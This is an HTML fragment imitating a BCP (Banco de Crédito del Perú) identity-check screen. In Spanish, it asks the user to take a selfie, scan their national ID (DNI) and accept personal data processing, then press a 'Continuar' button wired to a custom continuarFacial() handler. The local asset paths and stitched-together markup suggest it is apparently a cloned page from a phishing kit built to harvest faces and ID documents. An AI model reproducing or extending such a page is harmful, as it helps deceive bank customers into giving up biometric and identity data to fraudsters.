											...
											<div _ngcontent-aqk-c63="" class="row mt8 mb32" style="margin-bottom: 0px;margin-top:0px;">
												<div _ngcontent-aqk-c63="" class="col text-center">
													<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
														<h4 class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 600; position: relative; color: var(--primary-700,#002a8d); width: 80%; margin-left: 10%; font-family: var(--bcp-font-family-primary-demi,'Flexo-Demi'),helvetica,arial,sans-serif; font-size: 1.5rem; line-height: 2rem; text-align: center; text-rendering: optimizeLegibility; top: 20px;">Tómate una foto y <br> escanea tu DNI
														</h4>		
														<h4  class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 400; position: relative; color: #001f5a; font-size: 0.875rem; line-height: 1.2; font-family: var(--bcp-font-family-primary-regular,'Flexo-Regular'),helvetica,arial,sans-serif; width: 80%; margin-left: 10%; text-align: center; text-rendering: optimizeLegibility; margin-top: 30px;">Por tu <span style="font-weight:600;">seguridad</span>, lo validaremos con RENIEC.
																...
																<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																	<bcp-input class="hydrated">
																		<div class="form-group" style="align-items: center; position: relative; justify-content: center; display: flex;">
																			<img src="files/facial-consent-mobile.svg">
																		</div>
																		<bcp-paragraph class="helper-text hydrated" style="display:flex;margin:0;">
																			<div class="terminosycondiciones" style="padding-top: 40px; display: inline-flex; width: 90%; left: 5%; position: relative;">
																				<img src="files/checkorange.jpg" style="height: 16px; position: relative;">
																				<span class="spancuota" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif color: #001f5a;font-weight: initial;color: #001f5a;padding-left: 5%;font-size: 16px;">He leído y acepto el <span style="color:#e45e00!important">Tratamiento de datos personales.</span></span>
																			</div>
																			
																		</bcp-paragraph>
																		<button type="button" onclick="continuarFacial()" id="btnconfirmarprestamo" value="" style="color: var(--secondary-400,#ff961f); border-radius: 20px; width: 60%; height: 40px; padding: 12px; left: 20%; top: 40px; line-height: 16px; background-color: var(--secondary-400,#ff961f); border: var(--secondary-400,#ff961f); margin-top: 0px; display: flex; position: relative;margin-bottom:40px;"> 
																				<p id="parrafoaceptoelprestamo" style="width: 100%; color: white; font-size: 16px; text-align: center; position: relative;font-weight:600">Continuar</p>
